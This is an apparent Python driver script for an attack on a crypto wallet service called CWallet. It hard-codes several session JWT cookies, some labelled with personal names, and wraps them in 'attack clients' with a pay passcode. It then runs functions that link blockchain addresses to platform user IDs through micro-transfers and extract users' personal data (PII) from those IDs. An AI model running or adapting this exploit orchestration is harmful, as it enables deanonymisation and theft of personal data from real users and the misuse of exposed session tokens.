import asyncio
from script import executeAttack, executeUserIdToPII
from attack import CWalletClient
from coin import COINS
import logging
from logging.handlers import RotatingFileHandler


cookies = [
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzI3NmZnejg5M2pieWhibTh6YWplc3dwZXBqeSIsInNlc3Npb25faWQiOiI0MDk2Znl4YjgzcHc2amZnM3l4aWppemY4N2ptNWEiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUyNjI0NjEsImlhdCI6MTc3MjE5MDQ2MX0.FSjj7pf2EmPMegH1S6hJ82tZMpLnxvfWCVckfRPqSiQ", # Tina Smith
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzJ6eXdxemJuNTlweXRpcmc2dW9xZHNiY3A5eSIsInNlc3Npb25faWQiOiI0MDk2bTM3NHd6bzQ0ZmczZGdoNDdlYXh5Y283eGUiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUzODI1MzAsImlhdCI6MTc3MjMxMDUzMH0.ljwEUieag9mYiVUNQS7oUqCX6_hCSAHsVO1Yj2HgW84", # John Smith
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzM3MjhkYmVlMzRuZ3BqYmF6cGt0YmExcTl0dzU4eSIsInNlc3Npb25faWQiOiI0MDk2a3I4bmI1ZXk0dGI1aWMxZWQ5a2Rpd3htc28iLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUzODI2NzksImlhdCI6MTc3MjMxMDY3OX0.sZ9gImvVhfcrA3qxUItBW4goGZREbME7378FaAR3ASg", # Roger Smith
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzIxdDhrNzliNnM3eWl0ajlveWs1ZnRva3pvYyIsInNlc3Npb25faWQiOiI0MDk2OTF6dGdpanJzZjh4M3FmdHdmbnBzNHl0dGUiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUzODI4MDUsImlhdCI6MTc3MjMxMDgwNX0.rKc474GiyNSgqAOH_LXGquwR7Y47tKUfLApLMkpk4-I", # 1
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzIzYzQ0eWZhanJ0eTRmamhydTV3aG43NjRjZSIsInNlc3Npb25faWQiOiI0MDk2M201ZXFhaTNvdHl4N2YzdWkxaTFmMzFicm8iLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUzODMwMjAsImlhdCI6MTc3MjMxMTAyMH0.wERHKpKjTCuzkbIHylS6vLCRYN4SZ_sYkI24n5tsQCo", # 2
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzJiajh5ZnE5b3FmOHU1ZDVxd2NiOHgzenF5byIsInNlc3Npb25faWQiOiI0MDk2czF1M2hnN3FqdGd4enJvYmQzb3FkOWpyc28iLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUzODY1OTAsImlhdCI6MTc3MjMxNDU5MH0.wCHsmE1MeevGoMQHmgzxEIZ3sl5_THLUALxRmusl_hg", # 3
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzM3Mjhlczlvb3p5dW4zOG9kOGJ5cm83M3llbXhqYSIsInNlc3Npb25faWQiOiI0MDk2ejliOXJ1dDlucGJhcG4xZDN0Ym5oaWNtNGgiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUzODY2ODAsImlhdCI6MTc3MjMxNDY4MH0.3i5AfuKnIbsCWmjr_RxRTzQsZpbAtwiv7EDCqZyGWtA", # 4
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzM3MjhkODhkZ3F5aGgzZ3d0Z3hjdWVqMWprd3dybyIsInNlc3Npb25faWQiOiI0MDk2YnQ2dWE0Y2traXI5OWpkc21temtwaTUxY2MiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUzODY3ODAsImlhdCI6MTc3MjMxNDc4MH0.DhqL2QVMMPqgQVHWLxIbt7l6ejYr9mCL-ik5vB1YDNM", # 5
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzJmOWVtM3g5ZGVmeTVqZ3locXByb3EzanNpbyIsInNlc3Npb25faWQiOiI0MDk2eDV5eWF3em93aWZ1N25ocWZzeHE1b3p6anIiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUzODY4ODQsImlhdCI6MTc3MjMxNDg4NH0.CKfCTDwQXloUB3Y3AyS776tRDA22FlV-C7aathE-qaI", # 6
]


def setup_logging(enabled: bool = True):
    if not enabled:
        logging.disable(logging.CRITICAL)
        return
    # Keep root logger quiet
    logging.getLogger().setLevel(logging.WARNING)

    # File handler
    handler = RotatingFileHandler(
        "cwallet_debug.log",
        maxBytes=2_000_000,
        backupCount=3
    )
    handler.setLevel(logging.DEBUG)

    formatter = logging.Formatter(
        "%(asctime)s | %(levelname)s | %(name)s | %(message)s"
    )
    handler.setFormatter(formatter)

    # Attach ONLY to your module logger
    attack_logger = logging.getLogger("attack")
    attack_logger.setLevel(logging.DEBUG)
    attack_logger.addHandler(handler)

    # Silence noisy libraries explicitly
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)
    logging.getLogger("asyncio").setLevel(logging.WARNING)


async def userIdExtraction():
    # Cookies
    clients = []
    cookies = [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzI3NmZnejg5M2pieWhibTh6YWplc3dwZXBqeSIsInNlc3Npb25faWQiOiI0MDk2NXBkcGZzamZmN3lrZGVud3k5cW9pemg5NGEiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MDI3MjMsImlhdCI6MTc3MTgzMDcyM30.Pc8VsLkSU3Rx584fBAiAxBwizJKHGnPNdRAB0XFziME",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzIxdDhrNzliNnM3eWl0ajlveWs1ZnRva3pvYyIsInNlc3Npb25faWQiOiI0MDk2cm1yM2lqemo0N3J3dGVuaWJweHFwNTUxZnkiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MDk5NDQsImlhdCI6MTc3MTgzNzk0NH0.BUJSC2JnH_2RNV8ikfK2R27RmqwCcpXRz5JI-VGD9vM",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzIzYzQ0eWZhanJ0eTRmamhydTV3aG43NjRjZSIsInNlc3Npb25faWQiOiI0MDk2NXFuOXkxeGlrZnJ4aXkzZ2Y4Nmp1am44Z2MiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MTAxMTYsImlhdCI6MTc3MTgzODExNn0._Q_X3dj6XgYEvatE1M1KAbfDnA_obK7DdiB0VAuuKl8",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzJiajh5ZnE5b3FmOHU1ZDVxd2NiOHgzenF5byIsInNlc3Npb25faWQiOiI0MDk2cjl3aHQzazZqM2ZpNWJhamh6NW1vNGhobnIiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MTAyMjQsImlhdCI6MTc3MTgzODIyNH0.Q1vLO14dSnssCVwueSMwkYCAFl1kf-UnkjEVX3yFnmc",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzM3MjhkODhkZ3F5aGgzZ3d0Z3hjdWVqMWprd3dybyIsInNlc3Npb25faWQiOiI0MDk2N3BvaDdzZWR6M2d3M2JicGR3a2l4M2k5Z2MiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MTA4MzIsImlhdCI6MTc3MTgzODgzMn0.n9x0musb5f__9G85rDD9bwCD7TbWBsPnr4qjPpryo14",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzJmOWVtM3g5ZGVmeTVqZ3locXByb3EzanNpbyIsInNlc3Npb25faWQiOiI0MDk2enA3MzRrZG42cHIxdHE2aWM1cWI3NGRzZWEiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MTEwNzAsImlhdCI6MTc3MTgzOTA3MH0.74stdHBjrugCOls-str71B3zjzdyRpV2IKIXu3plwdM"
    ]
    # Creating attack clients
    for cookie in cookies:
        clients.append(CWalletClient(authCookie=cookie, payPassCode="111111"))

    # Getting Addresses
    addressesFileName = "unique_senders_alchemy.txt"
    resultsFileName = "results_eth.txt"
    amount = "0.00000001"
    cryptoCoin = COINS["ETH"]

    await executeAttack(
        addressesFileName=addressesFileName,
        resultsFileName=resultsFileName,
        clients=clients,
        coin=cryptoCoin,
        amount=amount
    )

async def userDataExtraction():
    # Cookies
    clients = []
    # Creating attack clients
    for cookie in cookies:
        clients.append(CWalletClient(authCookie=cookie, payPassCode="111111"))

    # Getting Addresses
    userIdsFileName = "results_eth.txt"
    resultsFileName = "results_eth_two.txt"

    await executeUserIdToPII(
        userIdsFileName=userIdsFileName,
        resultsFileName=resultsFileName,
        clients=clients,
    )


async def main():
    # await userIdExtraction()
    await userDataExtraction()

if __name__ == "__main__":
    setup_logging(enabled=True)
    asyncio.run(main())
